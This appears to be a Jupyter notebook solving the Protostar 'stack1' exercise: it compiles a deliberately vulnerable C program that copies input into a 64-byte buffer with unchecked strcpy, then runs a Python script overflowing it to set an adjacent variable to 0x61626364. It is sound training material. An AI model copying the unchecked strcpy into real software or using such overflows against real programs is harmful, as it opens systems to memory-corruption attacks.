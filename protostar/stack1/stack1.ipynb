{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "13c10c12",
   "metadata": {},
   "source": [
    "# protostar/stack1 solution\n",
    "\n",
    "https://exploit.education/protostar/stack-one/"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "53232e27",
   "metadata": {},
   "source": [
    "## compile source code"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "2864743d",
   "metadata": {},
   "outputs": [],
   "source": [
    "import os\n",
    "\n",
    "src = r\"\"\"\n",
    "\n",
    "#include <stdlib.h>\n",
    "#include <unistd.h>\n",
    "#include <stdio.h>\n",
    "#include <string.h>\n",
    "\n",
    "int main(int argc, char **argv)\n",
    "{\n",
    "  volatile int modified;\n",
    "  char buffer[64];\n",
    "\n",
    "  if(argc == 1) {\n",
    "      errx(1, \"please specify an argument\\n\");\n",
    "  }\n",
    "\n",
    "  modified = 0;\n",
    "  strcpy(buffer, argv[1]);\n",
    "\n",
    "  if(modified == 0x61626364) {\n",
    "      printf(\"you have correctly got the variable to the right value\\n\");\n",
    "  } else {\n",
    "      printf(\"Try again, you got 0x%08x\\n\", modified);\n",
    "  }\n",
    "}\n",
    "\n",
    "\"\"\"\n",
    "\n",
    "with open(\"src.c\", \"w\") as f:\n",
    "    f.write(src)\n",
    "    \n",
    "_ = os.system('gcc src.c -m32 -w -o prog')  # 32bit. disable warnings."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6f905ff2",
   "metadata": {},
   "source": [
    "## solution\n",
    "\n",
    "Typing a string with length > 64 will cause a buffer overflow.\n",
    "The next 4 bytes after the buffer should be `0x61626364`."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "ec0e683a",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "you have correctly got the variable to the right value\n",
      "\n"
     ]
    }
   ],
   "source": [
    "#!/usr/bin/env python3\n",
    "import subprocess\n",
    "import struct\n",
    "\n",
    "str =  b'A'*64 + struct.pack(\"<I\", 0x61626364)  # Pack 0x61626364 as little endian.\n",
    "res = subprocess.run(['./prog', str], capture_output=True)\n",
    "print(res.stdout.decode('utf-8'))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "2146293d",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Python version\n",
      "3.9.10 (main, Jan 16 2022, 17:12:18) \n",
      "[GCC 11.2.0]\n"
     ]
    }
   ],
   "source": [
    "import sys\n",
    "print(\"Python version\")\n",
    "print (sys.version)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.10"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
